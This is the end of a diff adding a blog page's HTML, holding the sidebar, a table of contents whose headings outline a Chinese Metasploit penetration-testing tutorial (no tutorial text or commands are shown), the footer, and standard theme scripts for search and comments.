+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Cy9nus">
+            
+              <p class="site-author-name" itemprop="name">Cy9nus</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/Cy9nusG4rd3n" title="GitHub &rarr; https://github.com/Cy9nusG4rd3n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:595318589@qq.com" title="E-Mail &rarr; mailto:595318589@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://weibo.com/" title="Weibo &rarr; https://weibo.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://plus.google.com/" title="Google &rarr; https://plus.google.com/" rel="noopener" target="_blank"><i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+            </div>
+          
+		  <div id="music163player">
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=34341308&auto=1&height=66"></iframe>
+</div>
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#metasploit学习"><span class="nav-number">1.</span> <span class="nav-text">metasploit学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#主机发现"><span class="nav-number">1.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口扫描"><span class="nav-number">1.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#目录扫描"><span class="nav-number">1.3.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DAVTest上传测试"><span class="nav-number">1.4.</span> <span class="nav-text">DAVTest上传测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#制作php木马"><span class="nav-number">1.5.</span> <span class="nav-text">制作php木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#向目标传马"><span class="nav-number">1.6.</span> <span class="nav-text">向目标传马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反弹shell"><span class="nav-number">1.7.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ms18-8120提权"><span class="nav-number">1.8.</span> <span class="nav-text">ms18_8120提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程监控"><span class="nav-number">1.9.</span> <span class="nav-text">远程监控</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单后渗透尝试"><span class="nav-number">1.10.</span> <span class="nav-text">简单后渗透尝试</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cy9nus</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共5k字</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.6" zindex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.5.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'g6m8NJreyw7EDEGnHk5jtKwq-gzGzoHsz',
+        appKey: 'evJGU4bX7K62eAyT9bH4eNUn',
+        placeholder: '到此一游？',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: false
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
